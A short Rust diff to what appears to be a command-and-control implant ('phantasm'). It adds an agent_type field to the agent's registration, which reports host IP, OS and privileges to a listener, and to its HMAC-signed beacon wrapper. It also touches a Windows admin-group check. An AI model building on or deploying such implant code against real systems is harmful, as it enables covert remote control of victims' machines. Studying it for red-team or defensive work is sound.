@@ -54,6 +54,8 @@ struct AgentRegistration {
     name: String,
     ip: String,
     os: String,
+    #[serde(rename = "agent_type")]
+    agent_type: String,
     #[serde(rename = "reconnectInterval")]
     reconnect_interval: u64,
     privileges: String,
@@ -134,6 +136,7 @@ fn wrap_with_hmac(data: &Value, key: &[u8]) -> Result<Vec<u8>, Box<dyn std::erro
     let (timestamp, signature) = sign_request("POST", LISTENER_ENDPOINT, &json_data, key);
 
     let wrapper = json!({
+        "agent_type": "phantasm",
         "data": serde_json::value::RawValue::from_string(json_data)?,
         "timestamp": timestamp,
         "signature": signature,
@@ -179,6 +182,7 @@ async fn register_agent(
         name: state.agent_id.clone(),
         ip: get_local_ip(),
         os: get_os_info(),
+        agent_type: "phantasm".to_string(),
         reconnect_interval: state.reconnect_interval,
         privileges: get_privilege_info(),
     };
@@ -784,7 +788,7 @@ fn check_admin_group() -> bool {
     
     unsafe {
         // Create the Administrators group SID
-        let mut sid_auth = SID_IDENTIFIER_AUTHORITY {
+        let sid_auth = SID_IDENTIFIER_AUTHORITY {
             Value: [0, 0, 0, 0, 0, 5], // SECURITY_NT_AUTHORITY
         };
         
